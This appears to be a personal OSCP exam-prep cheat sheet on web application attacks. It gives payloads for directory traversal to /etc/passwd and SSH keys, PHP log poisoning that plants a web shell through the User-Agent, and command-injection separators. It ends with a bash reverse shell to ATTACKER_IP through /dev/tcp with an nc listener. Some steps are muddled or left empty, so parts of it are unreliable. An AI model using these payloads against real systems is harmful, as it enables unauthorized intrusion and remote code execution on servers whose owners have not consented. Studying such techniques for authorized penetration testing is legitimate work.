OSCP Notes, Web Application Attacks Cheat Sheet

I want to go over this, since many of the boxes I've seen and worked on have focused on understanding OWSAP10. Now I will have a separate section for notes on SQL injection, because that is a beast of a subject. I will come back to that for the series of notes. For now, I want to focus on the larger common-based attack and what to fuzz.

  1. Directory Traversal
  2. File Inclusion
  3. Upload
  4. Command Injection

These types and SQL Injections will most likely be tested. So not a lot of XXS or IDOR. It's good to know, however, that the goal is to gain access, and these should be a primary focus. But there are a few tools you really need to familiarize yourself with: Burp Suite, a directory tool like gobuster/dirsearch (note: your choice of tool), understanding curl, and Nikto. This helps with checking everything on the website.

Understanding absolute vs. relative paths is key. An absolute path starts from the root of the file system, while it gives a complete location:

/ = filesystem root
/etc/passwd 
Start at root --> got to /etc --> open passwd

Windows is almost the samething:
C:\Windows\System32\cmd.exe -- example

The code in PHP provided is:

include($_GET['page']);

And the result of that is:

http://target.com/index.php?page=about.php

anything after = can be tested, this could lead to lfi 

Such as: 
http://target.com/index.php?page=/etc/passwd

Then the response would be the users listed 
Visualise this:
/var/www/html/images/ --> (example) this is the directory you locating as root

Relative paths are based on the current working directory. It also depends on where you currently are in the file system:

/var/www/html/images/dog.jpg --> example

The normal request is still be this:
http://target.com/view?file=dog.jpg

include("images/" . $_GET['file']); --note on this, same code

however the directory is "images/"

So anything from /images is the target area such as:
images/../../../../etc/passwd

images/.. = move up

therego: /var/www/html/images/ 
from images/../ == /html
images../../ == www 
and so on

The user input stays inside allowed folder. From images, we can move up. 

Absolute path attack:
?page=/etc/passwd --> root


Relative Path Attack:
?page=../../../../etc/passwd --> dirctory location

Also, with absolute paths, you can locate the id_rsa private key to access a user's SSH session, shadow files, etc. This is step one. I like to use Burp Suite, send traffic to the repeater, and see if I can pull anything. Sometimes, I take a guess and check the website:

That leads to LFI/RFI (file inclusion). Here’s the difference between Directory Traversal vs LFI:

?page=../../../../etc/passwd --> reading files outside intended directory

include($_GET['page']); 
?page=../../../../etc/passwd

However, we can do php log poisoning
Step one:
?page=../../../../var/log/apache2/access.log

Step two:
echo "<?php echo system($_GET['cmd']); ?>" > access.log

Step three:
curl -A "<?php system($_GET['cmd']); ?>" http://target.com/

Step four:
?page=../../../../var/log/apache2/access.log&cmd=id
Check for id


Now you can go for a reverse shell command with the bash

Another way too:

<?php system($_GET['cmd']); ?> --> like before
?page=../../../../proc/self/environ --common folder path (example)


PHP session posing:

Command Injections are also my favorite! Command injection occurs when user input is passed to system commands without proper sanitization.

system("ping " . $_GET['ip']);
?ip=8.8.8.8 --> to a website
then ping 8.8.8.8
ping 8.8.8.8; id is the result

IMPORTANT:

Linux
;   → run next command
&&  → run if previous succeeds
||  → run if previous fails
|   → pipe output
` ` → command substitution
$( ) → command substitution

Examples
127.0.0.1; id
127.0.0.1 && whoami
127.0.0.1 | id
127.0.0.1`id`
127.0.0.1$(id)

Windows
&
&&
|


Example:

127.0.0.1 & whoami
$ip = $_GET['ip'];
system("ping -c 4 " . $ip); --> basically what its calling for
The request:
http://target.com/ping.php?ip=8.8.8.8
ping -c 4 8.8.8.8

http://target.com/ping.php?ip=8.8.8.8;id
ping -c 4 8.8.8.8; id
output:
uid=33(www-data) gid=33(www-data) --> also with ip ping count

Then it's just a reverse shell from there:

nc -lvnp 4444

http://target.com/ping.php?ip=8.8.8.8; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
And check for shell

remember:
User Input → System Command → Shell Execution
